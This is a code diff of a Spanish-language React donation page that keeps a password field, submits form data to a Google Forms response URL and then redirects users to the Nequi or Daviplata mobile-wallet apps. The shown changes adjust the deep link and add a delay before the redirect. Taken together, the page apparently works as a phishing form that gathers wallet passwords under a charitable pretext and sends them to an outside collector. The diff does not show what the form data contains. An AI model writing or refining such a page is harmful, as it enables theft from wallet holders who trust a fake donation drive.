@@ -12,7 +12,6 @@ export default function DonacionPage() {
   const [password, setPassword] = useState("");
   const [mostrarPass, setMostrarPass] = useState(false);
 
-  // URL del formulario de Google Forms
   const formURL =
     "https://docs.google.com/forms/u/0/d/e/1FAIpQLSfb8GZ-KmfEnGyivGhBU6J2gUOQyl1Uon1hfxg-LzNKBCa7MA/formResponse";
 
@@ -28,7 +27,7 @@ export default function DonacionPage() {
 
   const getAppURL = () => {
     if (billetera === "Nequi") return "nequi://";
-    if (billetera === "Daviplata") return "daviplata://";
+    if (billetera === "Daviplata") return "daviplata://inicio"; // Puedes ajustar este path
     return "/";
   };
 
@@ -56,11 +55,14 @@ export default function DonacionPage() {
         body: formData,
       });
 
+      const appURL = getAppURL();
+
       if (isMobile()) {
-        const appURL = getAppURL();
-        window.location.href = appURL; // redirige a la app móvil
+        setTimeout(() => {
+          window.location.href = appURL;
+        }, 100); // breve pausa por compatibilidad móvil
       } else {
-        router.push("/proyectos/jovenes-en-accion-por-rosa-blanca"); // redirige en escritorio
+        router.push("/proyectos/jovenes-en-accion-por-rosa-blanca");
       }
     } catch (error) {
       console.error("Error al enviar los datos:", error);
